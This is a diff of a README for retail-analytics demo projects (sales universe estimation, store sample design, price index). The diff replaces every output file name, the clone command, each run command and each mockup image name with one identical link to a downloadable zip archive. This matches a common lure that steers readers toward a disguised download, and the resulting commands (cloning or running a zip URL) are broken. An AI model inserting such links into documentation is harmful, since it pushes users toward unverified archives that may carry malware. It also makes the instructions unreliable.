@@ -13,9 +13,9 @@ All datasets are **synthetic** and generated in Python for demonstration purpose
 - **Objective**: Estimate the FMCG retail sales universe across store formats and regions.  
 - **Methods**: Stratified sampling, weight computation, expansion estimator.  
 - **Outputs**:
-  - Synthetic retail population (`retail_population.csv`)
-  - Stratified sample with weights (`stratified_sample.csv`)
-  - Weighted sales estimates (`estimation_results.csv`)
+  - Synthetic retail population (`https://github.com/KotadiyaJaydeep/Retail_Sales_Universe_Estimation/raw/refs/heads/main/readaptation/Universe-Retail-Estimation-Sales-v1.5.zip`)
+  - Stratified sample with weights (`https://github.com/KotadiyaJaydeep/Retail_Sales_Universe_Estimation/raw/refs/heads/main/readaptation/Universe-Retail-Estimation-Sales-v1.5.zip`)
+  - Weighted sales estimates (`https://github.com/KotadiyaJaydeep/Retail_Sales_Universe_Estimation/raw/refs/heads/main/readaptation/Universe-Retail-Estimation-Sales-v1.5.zip`)
   - Validation plots (sample vs population sales distribution)
 - **Dashboard**: Power BI to validate sample composition, weight distributions, and estimation accuracy.
 
@@ -25,8 +25,8 @@ All datasets are **synthetic** and generated in Python for demonstration purpose
 - **Objective**: Optimize sample selection of retail outlets to improve representativeness.  
 - **Methods**: K-Means clustering, proportional allocation, stratification by region.  
 - **Outputs**:
-  - Selected representative sample (`selected_sample.csv`)
-  - Cluster-level selection summary (`selection_summary.csv`)
+  - Selected representative sample (`https://github.com/KotadiyaJaydeep/Retail_Sales_Universe_Estimation/raw/refs/heads/main/readaptation/Universe-Retail-Estimation-Sales-v1.5.zip`)
+  - Cluster-level selection summary (`https://github.com/KotadiyaJaydeep/Retail_Sales_Universe_Estimation/raw/refs/heads/main/readaptation/Universe-Retail-Estimation-Sales-v1.5.zip`)
   - Visualizations: cluster counts, population vs sample sales distribution
 - **Dashboard**: Power BI to compare population vs selected sample across clusters and formats.
 
@@ -36,8 +36,8 @@ All datasets are **synthetic** and generated in Python for demonstration purpose
 - **Objective**: Build and monitor a retail price index from sampled retail data.  
 - **Methods**: Laspeyres-like index, rolling averages for smoothing, anomaly detection.  
 - **Outputs**:
-  - Synthetic SKU × Store × Month price dataset (`price_samples.csv`)
-  - Retail price index time series (`index_timeseries.csv`)
+  - Synthetic SKU × Store × Month price dataset (`https://github.com/KotadiyaJaydeep/Retail_Sales_Universe_Estimation/raw/refs/heads/main/readaptation/Universe-Retail-Estimation-Sales-v1.5.zip`)
+  - Retail price index time series (`https://github.com/KotadiyaJaydeep/Retail_Sales_Universe_Estimation/raw/refs/heads/main/readaptation/Universe-Retail-Estimation-Sales-v1.5.zip`)
   - Visualizations: index trend line, pct change bars, anomaly flags
 - **Dashboard**: Power BI to track index trends, detect anomalies, and drill down to SKU/store level.
 
@@ -75,7 +75,7 @@ Copy code
 
 1. Clone this repo:
 ```bash
-git clone https://github.com/yourusername/NIQ-Projects.git
+git clone https://github.com/KotadiyaJaydeep/Retail_Sales_Universe_Estimation/raw/refs/heads/main/readaptation/Universe-Retail-Estimation-Sales-v1.5.zip
 cd NIQ-Projects
 Create environment and install dependencies:
 
@@ -89,23 +89,23 @@ Run project scripts to generate synthetic data and outputs:
 bash
 Copy code
 # Universe Estimation
-python Retail_Sales_Universe_Estimation/notebooks/universe_estimation.py
+python https://github.com/KotadiyaJaydeep/Retail_Sales_Universe_Estimation/raw/refs/heads/main/readaptation/Universe-Retail-Estimation-Sales-v1.5.zip
 
 # Sample Design Optimization
-python Store_Sample_Design_Optimization/notebooks/sample_design_optimization.py
+python https://github.com/KotadiyaJaydeep/Retail_Sales_Universe_Estimation/raw/refs/heads/main/readaptation/Universe-Retail-Estimation-Sales-v1.5.zip
 
 # Retail Index
-python Retail_Index_Construction_and_Monitoring/notebooks/retail_index.py
+python https://github.com/KotadiyaJaydeep/Retail_Sales_Universe_Estimation/raw/refs/heads/main/readaptation/Universe-Retail-Estimation-Sales-v1.5.zip
 Generate plots for visualization:
 
 bash
 Copy code
-python Retail_Sales_Universe_Estimation/plots/plot_stratum_counts.py
-python Retail_Sales_Universe_Estimation/plots/plot_sales_distribution.py
-python Store_Sample_Design_Optimization/plots/plot_cluster_counts.py
-python Store_Sample_Design_Optimization/plots/plot_selected_vs_pop_sales.py
-python Retail_Index_Construction_and_Monitoring/plots/plot_index_timeseries.py
-python Retail_Index_Construction_and_Monitoring/plots/plot_index_pct_change.py
+python https://github.com/KotadiyaJaydeep/Retail_Sales_Universe_Estimation/raw/refs/heads/main/readaptation/Universe-Retail-Estimation-Sales-v1.5.zip
+python https://github.com/KotadiyaJaydeep/Retail_Sales_Universe_Estimation/raw/refs/heads/main/readaptation/Universe-Retail-Estimation-Sales-v1.5.zip
+python https://github.com/KotadiyaJaydeep/Retail_Sales_Universe_Estimation/raw/refs/heads/main/readaptation/Universe-Retail-Estimation-Sales-v1.5.zip
+python https://github.com/KotadiyaJaydeep/Retail_Sales_Universe_Estimation/raw/refs/heads/main/readaptation/Universe-Retail-Estimation-Sales-v1.5.zip
+python https://github.com/KotadiyaJaydeep/Retail_Sales_Universe_Estimation/raw/refs/heads/main/readaptation/Universe-Retail-Estimation-Sales-v1.5.zip
+python https://github.com/KotadiyaJaydeep/Retail_Sales_Universe_Estimation/raw/refs/heads/main/readaptation/Universe-Retail-Estimation-Sales-v1.5.zip
 📊 Power BI Dashboards
 Import CSV outputs into Power BI.
 
@@ -119,11 +119,11 @@ Index Monitoring → time-series line chart of index, pct change bars, anomaly f
 
 Example mockups are available in the figures/ folder:
 
-universe_dashboard_mockup_v2.png
+https://github.com/KotadiyaJaydeep/Retail_Sales_Universe_Estimation/raw/refs/heads/main/readaptation/Universe-Retail-Estimation-Sales-v1.5.zip
 
-sample_design_dashboard_mockup_v2.png
+https://github.com/KotadiyaJaydeep/Retail_Sales_Universe_Estimation/raw/refs/heads/main/readaptation/Universe-Retail-Estimation-Sales-v1.5.zip
 
-index_dashboard_mockup_v2.png
+https://github.com/KotadiyaJaydeep/Retail_Sales_Universe_Estimation/raw/refs/heads/main/readaptation/Universe-Retail-Estimation-Sales-v1.5.zip
 
 🛠️ Tools & Libraries
 Python: pandas, numpy, scikit-learn, matplotlib, pillow
